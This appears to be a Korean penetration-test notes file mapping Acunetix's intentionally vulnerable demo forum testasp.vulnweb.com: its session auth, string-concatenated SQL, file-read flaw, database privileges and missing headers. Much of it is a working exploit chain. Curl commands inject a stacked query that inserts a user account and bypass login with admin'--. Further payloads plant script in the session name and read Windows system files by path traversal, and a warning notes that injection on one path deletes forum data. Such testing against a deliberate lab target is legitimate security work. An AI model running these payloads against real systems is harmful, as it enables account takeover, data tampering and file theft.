# 서버 구조 — testasp.vulnweb-jev-trial

대상: http://testasp.vulnweb.com (Acunetix 공개 취약 테스트 포럼, `acuforum`)
갱신: 2026-09-28 (Round 1 정찰 + Round 2·3 실증)

## 인증 방식

- **ASP 세션 쿠키 방식**(JWT 아님). 쿠키명 `ASPSESSIONIDCCCTQDSA`, 속성은 `path=/` 뿐 —
  **HttpOnly / Secure / SameSite 전부 없음**(Set-Cookie 실측).
- 로그인 경로: `POST /Login.asp` (`application/x-www-form-urlencoded`), 필드 `tfUName` / `tfUPass`,
  CSRF 토큰 없음, `action=""`(자기 자신 POST).
- 성공 시 `Session.Contents("uname")` 에 **입력값 원문**을 저장하고 `Response.Redirect("Default.asp")`
  (또는 `RetURL` 이 있으면 그 값으로) → 302 + 세션 쿠키 발급.
- 로그인 후 모든 페이지 메뉴가 `logout <uname>` 을 **HTML 인코딩 없이** 출력한다(저장형 XSS 표면).

### 재현 가능한 로그인 curl

정상 로그인 (Round 3에서 SQLi로 생성한 계정 — **공개 데모는 수시로 리셋되므로 없으면
아래 '우회 로그인'을 쓰거나 다시 생성할 것**):

```bash
# 계정 생성(임의 DML 증명 겸용, 스택드 쿼리):
curl -s -o /dev/null -G --data-urlencode "id=0;INSERT INTO users (uname,upass,email,realname,avatar) VALUES('acu-r3','P@ss-r3-verify','r3@example.com','r3','')--" \
     http://testasp.vulnweb.com/showforum.asp

# 정상 로그인:
curl -s -i -c /tmp/acu.cookies -X POST \
  --data-urlencode "tfUName=acu-r3" --data-urlencode "tfUPass=P@ss-r3-verify" \
  http://testasp.vulnweb.com/Login.asp
# 응답: HTTP/1.1 302 Object moved / Location: Default.asp / Set-Cookie: ASPSESSIONID...=...
# 이후 모든 요청에: -b /tmp/acu.cookies
```

우회 로그인 (SQLi — Round 2 확정, 행 반환이면 세션 부여):

```bash
curl -s -i -c /tmp/acu.cookies -X POST \
  --data-urlencode "tfUName=admin'--" --data-urlencode "tfUPass=x" \
  http://testasp.vulnweb.com/Login.asp
# 응답: 302 Location: Default.asp + Set-Cookie
# ※ 이 세션의 uname 에 따옴표가 남아 second-order(게시 시 500)를 유발한다 — 게시가 필요하면 정상 계정 세션을 쓸 것
```

## 데이터 흐름 / API 패턴

- REST/JSON 아님. **서버측 렌더링(SSR) classic ASP + ADO(ADODB.Connection / ADODB.Recordset)**,
  전부 쿼리스트링·폼 파라미터(`?id=`, `?tfSearch=`, `?item=`, `?RetURL=`, `POST tfUName/tfUPass/tfSubject/tfText`).
- SQL은 **문자열 결합**(파라미터화 없음). 실측 확정 지점:
  - `Login.asp:33` — `SELECT uname, upass FROM users WHERE uname='" & tfUName & "' AND upass='" & tfUPass & "'"`
  - `Search.asp:78` — `... WHERE ... AND (CHARINDEX(a.title,'"&st&"')>0 OR CHARINDEX(a.message,'"&st&"')>0)`
    (SELECT 목록 **10열**, 결과가 페이지에 렌더 → UNION 추출 가능)
  - `showforum.asp:34/50/56/58/70`, `showthread.asp:42/56` — `WHERE id=" & Request.QueryString("id")`
  - `Register.asp:33-37` — `INSERT INTO users (...) VALUES (...)` 입력값 무이스케이프
  - `showthread.asp:60-62` — `INSERT INTO posts` 에 `Session.Contents("uname")` 은 무이스케이프,
    `tfSubject`/`tfText` 는 따옴표만 `Replace(...,"'","''")` (HTML 인코딩 없음 → 저장형 XSS)
- DB: `Database=acuforum`, 접속은 `db.asp` 의 `GetConnection()` (`db.asp:31` 평문 접속문자열).
  `db.asp` 는 `loginput.asp` 를 `#INCLUDE`(로깅 호출은 주석 처리).

## 파일 읽기 프리미티브 (LFI)

- `Templatize.asp?item=<웹루트 상대경로>` — Dreamweaver 템플릿에 파일 내용을 삽입해 반환.
  **인코딩 없이 raw `../`** 로 웹루트 밖 탈출(초과 `..` 는 무시됨). 부재 파일은 500(대조군 필수).
  실측: `../../../../windows/win.ini` → 200/2763, `windows/system.ini` → 200/2896,
  `windows/system32/drivers/etc/hosts` → 200/3597. 앱 자신의 `.asp` 소스도 평문 반환.
- `shownews.asp?item=<웹루트 상대경로>` — 같은 프리미티브의 **두 번째 인스턴스**(템플릿 래퍼 없이
  파일 내용만 반환, 출력만 HTMLEncode). `../../../../windows/win.ini` → 200/92B(raw).
- 웹루트 밖 `C:\scripts\logInput.txt` 는 읽히지 않음(깊이 1~5 전부 500, 같은 형식 대조군은 200).

## DB 계층 / 권한 (읽기 전용 오라클 실측, Round 3)

- `SUSER_NAME()`=`USER_NAME()`=`acunetix`, `sys.databases` 7개(acuforum, acublog, acuservice 포함).
- **불가**: `IS_SRVROLEMEMBER('sysadmin')=0`, `CONTROL SERVER=0`, `xp_cmdshell value_in_use=0`,
  `ALTER ANY DATABASE=0`, `BULK OPERATIONS=NULL` → OS 명령 실행/스키마 변경/권한 상승 경로 없음.
- **가능(읽기)**: `acublog.dbo.users` 1행, `acuservice.dbo.users` 2행 조회(행 수만 확인, 값 미추출).
- **가능(쓰기 권한 존재, 실행은 하지 않음)**: `acuforum.dbo.users` UPDATE=1,
  `acuforum.dbo.posts` INSERT=1, **`acublog.dbo.users` UPDATE=1** (교차 DB 쓰기 권한).
- SQLi 벡터: `Search.asp?tfSearch=`(UNION 10열, 1요청 추출) / `showforum.asp?id=`·
  `showthread.asp?id=`(boolean 200 vs 500, 스택드 `WAITFOR DELAY` 지연 오라클; UNION 불가).

## ⚠️ 파괴적 분기 (재현 시 주의)

`showforum.asp:54-59` 와 `showthread.asp:46-48` — **POST 경로에서** 대상 thread/forum 의
행 수가 100을 넘으면 `DELETE FROM threads` / `DELETE FROM posts WHERE id<>0 AND threadid=<id>`
를 실행한다. 즉 **POST 요청의 `id` 파라미터에 주입하면 게시판 데이터가 삭제된다**.
→ 재현/공격 시 POST 경로 id 주입 금지, GET id 는 정수만 사용.

## tech_stack 근거

- `Server: Microsoft-IIS/8.5`, `X-Powered-By: ASP.NET`, 세션 쿠키 `ASPSESSIONID*`(=classic ASP, .NET 아님).
- 에러 페이지가 IIS 8.5 기본 500/404(상세 없음), `.asp` 소스 유출로 확인된 VBScript 코드 →
  **classic ASP + VBScript + ADO**.
- DB 접속 문자열 `Provider=SQLNCLI11;Server=(local)\SQL` + `@@version` = **Microsoft SQL Server 2014
  (SP3-GDR) 12.0.6179.1 X64 Express Edition on Windows NT 6.3 (Build 9600)**.
- `/_vti_*`(FrontPage Server Extensions 4.0.2.8912, 2007년 메타데이터) + 정적 Dreamweaver 템플릿
  (`*.dwt.asp`) + 2005년 TinyMCE 2.0RC4 → 2000년대 중반 제작 후 방치된 legacy 자산 신호.

## 보안 헤더

`Content-Security-Policy` / `X-XSS-Protection` / `X-Frame-Options` / `Strict-Transport-Security`
**전부 없음**(실측). `Cache-Control: private` 만 존재.

### 인증 판정 정밀 동작 (Round 4 실측)

- `Login.asp:33` 쿼리: `SELECT uname, upass FROM users WHERE uname='<입력>' AND upass='<입력>'`
- `Login.asp:36`: **`Session.Contents("uname") = Request.Form("tfUName")`** — 반환 행의 값이 아니라
  **입력 원문**이 세션에 저장된다(검증·이스케이프 없음).
- 판정은 `if not rs.EOF` (행 존재 여부) — 반환 행의 `upass` 를 제출값과 비교하지 **않는다**.
- 따라서:
  - `tfUName=admin'--` → 302 (행 반환 + 나머지 주석). **세션명에 따옴표가 들어간다** →
    게시 시 `posts.poster` 무이스케이프 결합으로 **second-order(500)** 유발.
  - `tfUName=admin' AND '<img src=x onerror=alert(1)>'='<img ...>'--` → 302, 세션명에 HTML 저장 →
    `Default.asp:55` 등이 `Server.HTMLEncode` 없이 출력 → **쓰기 없이 XSS**.
  - `tfUName=<img ...>'--` → **200(실패)**: `WHERE uname='<img ...>'` 가 0행.
  - `tfUName=x' OR '1'='1` → **200(실패)**: `WHERE uname='x' OR '1'='1' AND upass='x'` 의 AND 우선순위로 0행.
- 전체 체인 재현: `bash scripts/verify_chain.sh` (16섹션/65체크, 전부 읽기 전용).
